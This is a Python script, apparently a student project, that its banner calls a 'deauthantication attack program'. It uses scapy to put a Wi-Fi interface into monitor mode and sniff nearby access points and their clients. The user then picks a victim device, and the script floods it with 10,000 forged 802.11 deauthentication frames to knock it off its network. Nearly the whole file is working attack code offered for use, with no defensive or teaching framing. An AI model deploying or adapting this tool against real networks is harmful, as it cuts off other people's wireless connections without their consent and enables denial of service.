import os
from scapy.all import *
from threading import Thread
import pandas
import time
import netifaces

# global variables
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
networks.set_index("BSSID", inplace=True)
macs = dict()
interface = ""
network_mac = ""
devices_macs = dict()
victim_mac = ""
i2 = 0
tic = time.perf_counter()
ch = 1
devices = dict()
HMAP = dict()


def main():
    global victim_mac
    global network_mac
    global interface
    os.system("clear")

    # welcome screen 5 sec(for fun)
    print('          ##############################################################\n'
          '          #                                                            #\n'
          '          #               deauthantication attack program              #\n'
          '          #        by: mohamad assi, oday mahamed, medhat smar         #\n'
          '          ######################## please wait #########################\n')
    items = list(range(0, 5))
    # Initial call to print 0% progress
    printProgressBar(0, len(items), prefix='Please wait:', suffix='to start', length=50)
    for i, item in enumerate(items):
        time.sleep(1)
        printProgressBar(i + 1, len(items))
    os.system("clear")
    ######################################

    # get interface and change it to mode monitor
    print()
    interface_names = netifaces.interfaces()  # get interfaces
    interfaces_length = str(len(interface_names) - 1) + ""
    for i in range(0, len(interface_names)):
        print(i, ":", interface_names[i])
    interface_index = input("\nchoose the WIFI interface (press 0 - " + interfaces_length + "): ")
    while '0' > str(interface_index) or str(interface_index) > interfaces_length:  # if the user chose wrong number
        interface_index = input("\n\nERROR: please press 0 - " + interfaces_length + " from the interfaces list:")
    interface = interface_names[int(interface_index)]
    MonitorMode(interface)

    # change interface wifi channel
    os.system("clear")
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # print wifi networking
    items = list(range(0, 5))
    printProgressBar(0, len(items), prefix='Please wait:', suffix='to start', length=50)
    os.system("clear")
    print("\n\n                    searching for wifi networks - time: 1min\n")

    # scanning loading screen
    global tic
    tic = time.perf_counter()
    loading_min1 = Thread(target=loading_min)
    loading_min1.start()

    sniff(prn=callback, iface=interface, timeout=60)
    os.system("clear")

    print_all_networks()
    print_all_devices()

    os.system("clear")
    print("\n\n                   Attacking " + victim_mac + "MAC address!!\n")
    # ATTACK
    victim_mac = victim_mac.lower()  # device MAC address
    network_mac = network_mac.lower()  # access point MAC address
    dot11 = Dot11(type=0, subtype=12, addr1=victim_mac, addr2=network_mac, addr3=network_mac)
    # stack them up
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=0.1, count=10000, iface=interface, verbose=1)


# Print iterations progress
def printProgressBar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='█', printEnd="\r"):
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    print('                ' + bar, end='\r')
    # Print New Line on Complete
    if iteration == total:
        print()


def callback(pkt):
    if pkt.haslayer(Dot11):
        dot11_layer = pkt.getlayer(Dot11)
        DS = pkt.FCfield & 0x3  # 3
        to_DS = DS & 0x1 != 0  # 1
        from_DS = DS & 0x2 != 0  # 2
        if pkt.type == 0 and pkt.subtype == 8:
            if dot11_layer.addr2 and (dot11_layer.addr2 not in devices):
                HMAP[dot11_layer.addr2] = set()
                devices[str(dot11_layer.addr2)] = str(pkt.info)
        if to_DS == 0 and from_DS == 0:
            if dot11_layer.addr3 in devices and (dot11_layer.addr3 != dot11_layer.addr2) and dot11_layer.addr2 not in \
                    HMAP[dot11_layer.addr3]:
                HMAP[dot11_layer.addr3].add(dot11_layer.addr2)
        if to_DS == 0 and from_DS == 1:
            if dot11_layer.addr2 in devices and (dot11_layer.addr3 != dot11_layer.addr2) and dot11_layer.addr3 not in \
                    HMAP[dot11_layer.addr2]:
                HMAP[dot11_layer.addr2].add(dot11_layer.addr3)
        if to_DS == 1 and from_DS == 0:
            if dot11_layer.addr1 in devices and (dot11_layer.addr1 != dot11_layer.addr2) and dot11_layer.addr2 not in \
                    HMAP[dot11_layer.addr1]:
                HMAP[dot11_layer.addr1].add(dot11_layer.addr2)
        if to_DS == 1 and from_DS == 1:
            if dot11_layer.addr2 in devices and (dot11_layer.addr2 != dot11_layer.addr4) and dot11_layer.addr4 not in \
                    HMAP[dot11_layer.addr2]:
                HMAP[dot11_layer.addr2].add(dot11_layer.addr4)
            if dot11_layer.addr1 in devices and (dot11_layer.addr1 != dot11_layer.addr3) and dot11_layer.addr3 not in \
                    HMAP[dot11_layer.addr1]:
                HMAP[dot11_layer.addr1].add(dot11_layer.addr3)


def print_all_networks():
    global network_mac

    k = 0
    for network in devices:
        print(k, "-" + str(devices[network]) + "\t\t\t" + str(network))
        k += 1
    network_index = input("Choose Network(press 0 - " + str(k) + "): ")
    k = 0
    for network in HMAP:
        if k == int(network_index):
            chosen_victim = network
            break
        k += 1
    network_mac = chosen_victim  # chosen access point


# print_all_devices function to display to the user the devices in the network
def print_all_devices():
    global HMAP
    global network_mac
    global victim_mac
    clients_count = 0

    os.system("clear")
    for client in HMAP[network_mac]:
        print(clients_count, "-", client)
        clients_count = clients_count + 1
    device_number = input("Choose device to start the attack(press 0 - " + str(clients_count) + "): ")
    k = 0
    for client in HMAP[network_mac]:
        if k == int(device_number):
            victim_mac = client
            break
        k += 1


# change_channel function to go all over the wi-fi channels
def change_channel():
    global ch
    os.system("iwconfig " + interface + " channel " + str(ch))
    # switch channel from 1 to 14 each 0.5s
    ch = ch % 14 + 1
    time.sleep(0.5)


def loading_min():
    toc = time.perf_counter()
    timerr = tic - toc
    while timerr < 60:
        toc = time.perf_counter()
        timerr = toc - tic
        if timerr > 60:
            return
        global i2
        i2 = i2 + 1
        printProgressBar(i2, 60)
        time.sleep(1)


# turn on monitor mode
def MonitorMode(interface_name):
    try:
        os.system("bash run_monitor_mode.sh " + interface_name)
    except:
        print("ERROR: make sure that", interface_name, "interface can be changed to Monitor Mode.")
        sys.exit(0)


if __name__ == "__main__":
    main()
